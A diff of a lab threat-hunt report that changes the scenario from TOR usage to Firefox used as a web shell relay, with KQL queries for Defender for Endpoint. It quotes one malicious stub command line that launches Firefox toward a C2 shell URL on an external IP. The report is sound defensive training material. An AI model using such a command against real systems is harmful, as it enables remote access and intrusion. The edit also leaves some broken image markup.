@@ -1,26 +1,29 @@
 <img width="400" src="https://github.com/user-attachments/assets/06701f92-d410-4a48-b8b5-eba364812972" />
 
-                        
-
-
-# Threat Hunt Report: Unauthorized TOR Usage
+# Threat Hunt Report – Firefox Used as a Web Shell Relay
 - [Scenario Creation](https://github.com/antoniofranc/Threat-Hunt-Scenario-Firefox-as-a-Web-Shell-Relay-/blob/main/threat-hunting-scenario-firefox-as-a-web-shell-relay.md)
 
 ## Platforms and Languages Leveraged
 - Windows 10 Virtual Machines (Microsoft Azure)
 - EDR Platform: Microsoft Defender for Endpoint
 - Kusto Query Language (KQL)
-- Tor Browser
+- Mozilla Firefox (installed via malicious stub)
 
 ##  Scenario
 
-Management suspects that some employees may be using TOR browsers to bypass network security controls because recent network logs show unusual encrypted traffic patterns and connections to known TOR entry nodes. Additionally, there have been anonymous reports of employees discussing ways to access restricted sites during work hours. The goal is to detect any TOR usage and analyze related security incidents to mitigate potential risks. If any use of TOR is found, notify management.
+Security monitoring flagged suspicious behavior on workstation `snet` associated with user `employee0`.
+At first glance, the endpoint showed a deleted Firefox executable, but further telemetry revealed a malicious installation and usage of Firefox as a `web shell relay`.
+
+The installation was initiated through a malicious stub file that attempted to launch Firefox with a temporary malicious profile and connect to an external command-and-control (C2) URL hosted on `172.203.80.23`/admin/shell.php.
+
+This behavior strongly indicates unauthorized browser installation and potential remote access activity through web shell relay techniques.
+
 
 ### High-Level TOR-Related IoC Discovery Plan
 
-- **Check `DeviceFileEvents`** for any `tor(.exe)` or `firefox(.exe)` file events.
-- **Check `DeviceProcessEvents`** for any signs of installation or usage.
-- **Check `DeviceNetworkEvents`** for any signs of outgoing connections over known TOR ports.
+- **Check `DeviceFileEvents`** for creation or deletion of `firefox.exe` or related stub installers.
+- **Check `DeviceProcessEvents`** for suspicious Firefox process launches with command-line flags.
+- **Check `DeviceNetworkEvents`** for outbound HTTP requests to unauthorized IPs or domains.
 
 ---
 
@@ -28,20 +31,29 @@ Management suspects that some employees may be using TOR browsers to bypass netw
 
 ### 1. Searched the `DeviceFileEvents` Table
 
-I searched the DeviceFileEvents table for any file containing the string "tor" and discovered that user "walnet" downloaded a Tor Browser installer. Subsequently, numerous Tor-related files were copied to the Desktop, along with the creation of a file named "tor-shopping-list.txt" at 2025-10-05T01:30:42.6417593Z on the Desktop. These events began on October 5, 2025, 01:18:04 UTC (timestamp: 2025-10-05T01:18:04.9518825Z.
+Initial query revealed that employee0 executed a Firefox installer from their Downloads directory, which created temporary folders named Temp and MalProfile, later deleted.
+Evidence revealed a deleted executable:
+`C:\Program Files\Mozilla Firefox\firefox.exe`
+The deletion occurred at `2025-10-12 01:55:24 AM`, immediately after execution by user employee0.
+
+The initiating process was a suspicious stub: `setup-stub.exe -no-remote -profile "C:\Users\employee®@\Downloads\Temp\MalProfile" http://172.203.80.23/admin/shell.php`
 
 **Query used to locate events:**
 
 ```kql
-DeviceFileEvents  
-| where DeviceName == "walnet"  
-| where InitiatingProcessAccountName == "walnet"  
-| where FileName contains "tor"  
-| where Timestamp >= datetime(2025-10-05T01:18:04.9518825Z)  
-| order by Timestamp desc  
-| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, Account = InitiatingProcessAccountName
+DeviceFileEvents
+| where DeviceName == "snet"
+| where InitiatingProcessAccountName == "employee0"
+| where FileName contains "firefox.exe"
+| where FolderPath contains "Mozilla Firefox"
+| where Timestamp >=  datetime(2025-10-12T04:29:57.4331627Z)
+| order by Timestamp desc
+| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, Account = InitiatingProcessAccountName, InitiatingProcessCommandLine
+
+
 ```
-<img width="1427" height="578" alt="image" src="https://github.com/user-attachments/assets/89e3c64a-645c-4acc-9d33-00d218320769" />
+<img width="1427" height="578" alt="image" src="<img width="1872" height="295" alt="image" src="https://github.com/user-attachments/assets/0994355f-14ed-43a7-8f58-72f54ac9c8d2" />
+" />
 
 
 ---
